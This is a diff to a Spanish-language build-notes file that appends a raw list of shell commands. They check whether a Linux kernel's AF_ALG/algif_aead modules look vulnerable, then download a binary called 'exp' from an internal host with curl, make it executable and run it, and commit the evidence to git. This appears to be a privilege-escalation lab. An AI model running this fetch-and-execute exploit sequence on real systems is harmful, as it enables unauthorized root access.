@@ -124,3 +124,50 @@ Esta v2 incorpora los siguientes fixes respecto a la v1:
 - BusyBox: deshabilitado `CONFIG_TC` (rompe compilación con kernels nuevos)
 - BusyBox: forzado `CONFIG_STATIC=y` y verificado con `file`
 - Workflow Actions: greps de verificación con `|| echo`, tolerantes
+
+
+
+commands
+ 0 uname -r
+1 dmesg | grep "PF_ALG"
+2 history
+uname -r
+lsmod | grep alg
+id
+whoami
+cat /proc/modules | grep algif
+uname -r
+dmesg | grep "PF_ALG"
+id
+whoami
+cat /proc/crypto | grep -i "algif"
+
+{
+  echo "=== HITO 1: KERNEL VULNERABLE CONFIRMADO ==="
+  echo "Fecha: $(date)"
+  echo "Hostname: $(hostname)"
+  echo "Kernel: $(uname -r)"
+  echo "Identidad: $(id)"
+  echo "Módulos AF_ALG:"
+  lsmod | grep -i alg || echo "(no encontrado con lsmod, verificar /proc/modules)"
+  echo "algif_aead en /proc/modules:"
+  grep algif_aead /proc/modules 2>/dev/null || echo "(no encontrado)"
+} > /tmp/hito1.txt && cat /tmp/hito1.txt
+cp /tmp/hito1.txt evidence/hito1_vuln_confirmed.txt
+uname -r
+dmesg | grep "PF_ALG"
+id
+whoami
+cat /proc/crypto | grep -i "algif"
+curl -sS http://xint.internal:8000/exp -o exp
+shasum --algo 256 exp
+base64 exp
+echo "CONTENIDO_BASE64_AQUI" | busybox base64 -d > exp
+chmod +x exp
+ ./exp
+mount -t proc proc /proc
+lsmod
+git add evidence/hito1_vuln_confirmed.txt
+git commit -m "hito-1: kernel vulnerable confirmado - $(date +%Y-%m-%dT%H:%M)"
+git tag -a hito-1 -m "Kernel vulnerable corriendo, algif_aead confirmado"
+git push origin main --tags
